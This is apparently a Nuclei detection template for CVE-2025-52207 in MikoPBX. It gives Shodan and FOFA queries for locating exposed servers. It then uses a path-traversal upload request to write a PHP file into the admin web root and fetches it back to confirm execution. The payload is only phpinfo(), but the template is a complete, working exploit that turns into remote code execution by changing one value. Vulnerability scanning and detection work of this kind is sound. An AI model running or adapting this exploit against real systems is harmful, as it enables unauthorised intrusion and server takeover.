id: CVE-2025-52207

info:
  name: MIKO MikoPBX - Relative Path Traversal
  severity: critical
  author: darses
  description: |
    Detects CVE-2025-52207 in MIKO MikoPBX by uploading a phpinfo() file a to random location.
  metadata:
    vendor: miko
    product: mikopbx
    shodan-query:
      - product:"mikopbx"
      - http.favicon.hash:8309143
      - title:"MikoPBX"
    fofa-query:
      - icon_hash="8309143"
      - title="MikoPBX"
  tags: cve,cve2025,mikopbx,intrusive

variables:
  filecontent: "<?php phpinfo(); ?>"
  filename: "{{to_lower(rand_base(8))}}"

flow: http(1) && http(2)

http:
  - method: POST
    path:
      - "{{BaseURL}}/pbxcore/api/files/uploadFile"

    headers:
      Content-Type: "multipart/form-data; boundary=---------------------------{{filename}}"

    body: |
      -----------------------------{{filename}}
      Content-Disposition: form-data; name="resumableFilename"

      {{filename}}.php
      -----------------------------{{filename}}
      Content-Disposition: form-data; name="resumableIdentifier"

      ../../../../../../../../usr/www/sites/admin-cabinet/{{filename}}
      -----------------------------{{filename}}
      Content-Disposition: form-data; name="file"; filename="{{filename}}.php"
      Content-Type: application/octet-stream

      {{filecontent}}
      -----------------------------{{filename}}
      Content-Disposition: form-data; name="resumableChunkNumber"

      1
      -----------------------------{{filename}}
      Content-Disposition: form-data; name="resumableTotalChunks"

      1
      -----------------------------{{filename}}
      Content-Disposition: form-data; name="resumableTotalSize"

      {{len(filecontent)}}
      -----------------------------{{filename}}--

    matchers:
      - type: status
        internal: true
        status:
          - 200

      - type: word
        part: header
        internal: true
        words:
          - "Content-Type: application/json"
          - '{"jsonapi":{"version":"1.0"},"result":true,"data":'
        condition: and

    extractors:
      - type: json
        name: upload_path
        internal: true
        json:
          - .data.filename

      - type: dsl
        name: extracted_path
        internal: true
        dsl:
          - replace_regex(upload_path, "(.*)\/admin-cabinet\/", "")

  - method: GET
    path:
      - "{{BaseURL}}/admin-cabinet/§extracted_path§?{{wait_for(5)}}"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "This program is free software; you can redistribute it and/or modify it under the terms of the PHP License as published by the PHP Group and included in the distribution in the file"
